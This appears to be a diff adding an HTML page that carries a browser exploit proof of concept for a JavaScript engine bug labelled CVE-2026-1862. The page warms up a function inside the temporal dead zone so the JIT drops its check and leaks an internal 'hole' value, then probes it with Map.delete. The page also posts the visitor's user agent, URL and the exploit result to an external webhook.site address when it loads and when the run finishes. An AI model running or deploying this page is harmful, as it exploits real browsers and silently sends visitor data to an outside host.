@@ -1,0 +1,37 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>t</title></head><body>
+<div id="st">1862f warmup</div>
+<script>
+// CVE-2026-1862 FAITHFUL web adaptation, beaconed variant (cf testcase 6542937173196800)
+// f optimized during TDZ window; if the TDZ check is elided, the hole escapes.
+var TAG='1862f';
+var WH='https://webhook.site/70adeae7-cb85-4a68-9f39-6825a6d3a1ba';
+var RID=Math.random().toString(36).slice(2,8);
+function beacon(tag,extra){
+  try{
+    var p=JSON.stringify({cve:TAG,rid:RID,tag:tag,t:new Date().toISOString(),ua:navigator.userAgent,loc:location.href,extra:extra||null});
+    if(navigator.sendBeacon){ try{navigator.sendBeacon(WH,p);}catch(e){} }
+    try{ fetch(WH,{method:'POST',mode:'no-cors',body:p}); }catch(e){}
+  }catch(e){}
+}
+beacon('start');
+function f(){ return y; }
+var result = 'not-optimized';
+var stop = false;
+for (var i = 0; i < 150000 && !stop; i++) {
+    try { f(); } catch(e) {}
+    if (i % 5000 === 4999) {
+        var v;
+        try { v = f(); }          // probe: still throws = TDZ check alive
+        catch(e) { continue; }
+        result = 'HOLE-ESCAPED i=' + i + ' v=' + String(v);
+        try { new Map().delete(v); result += ' map-ok'; }
+        catch(e) { result += ' map-threw'; }
+        stop = true;
+    }
+    if (i % 25000 === 0) document.getElementById('st').textContent = 'warmup ' + i;
+}
+if (!stop) result = 'loop-done-no-escape';
+document.getElementById('st').textContent = result;
+beacon('end', {result: result});
+let y;   // declared LAST: the entire loop ran inside the TDZ window
+</script></body></html>
